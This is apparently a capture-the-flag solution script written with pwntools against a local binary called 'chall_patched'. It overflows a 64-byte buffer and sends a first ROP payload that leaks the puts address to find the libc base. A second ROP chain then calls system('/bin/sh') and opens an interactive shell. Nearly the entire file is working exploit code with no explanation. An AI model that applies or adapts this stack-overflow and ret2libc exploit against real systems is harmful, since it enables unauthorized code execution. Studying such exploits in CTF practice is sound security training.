#! /usr/bin/python3

from pwn import *

p = process("./chall_patched")
e = ELF("./chall_patched")
libc = ELF("./libc.so.6")

ret = 0x401016
read_int = 0x401176
main_427 = 0x401367

context.binary = e
context.log_level = "debug"


payload = b'A' * 64
payload += p64(e.bss()+0xf00) # e.bss()+0xf00)
payload += p64(ret) # padding
payload += p64(read_int)
payload += p64(main_427)

p.sendlineafter(b'Multiplayer', b'1')
p.sendlineafter(b'Enter world name:',payload)
p.sendlineafter(b'Creative', b'1')
p.sendlineafter(b'Exit', b'2 4210688') # leak libc (puts is at 0x404000)

p.recvline() 
libc.address = u64(p.recvline()[:-1]+b'\x00'*2) - libc.symbols.puts
print(hex(libc.address)) 

# pause()
p.sendline(b'1') # return to main menu

rop = ROP([e, libc], badchars=b'\n')
rop(rdi=next(libc.search(b'/bin/sh\0')))
rop.raw(rop.find_gadget(['ret']))
rop.system()
log.info(rop.dump())

payload = b'A' * 64
payload += p64(e.bss()+0xf00)
payload += rop.chain()

p.sendlineafter(b'Multiplayer', b'1')
p.sendlineafter(b'Enter world name:', payload)
p.sendlineafter(b'Creative', b'1')
p.sendlineafter(b'Exit', b'2')

p.interactive()

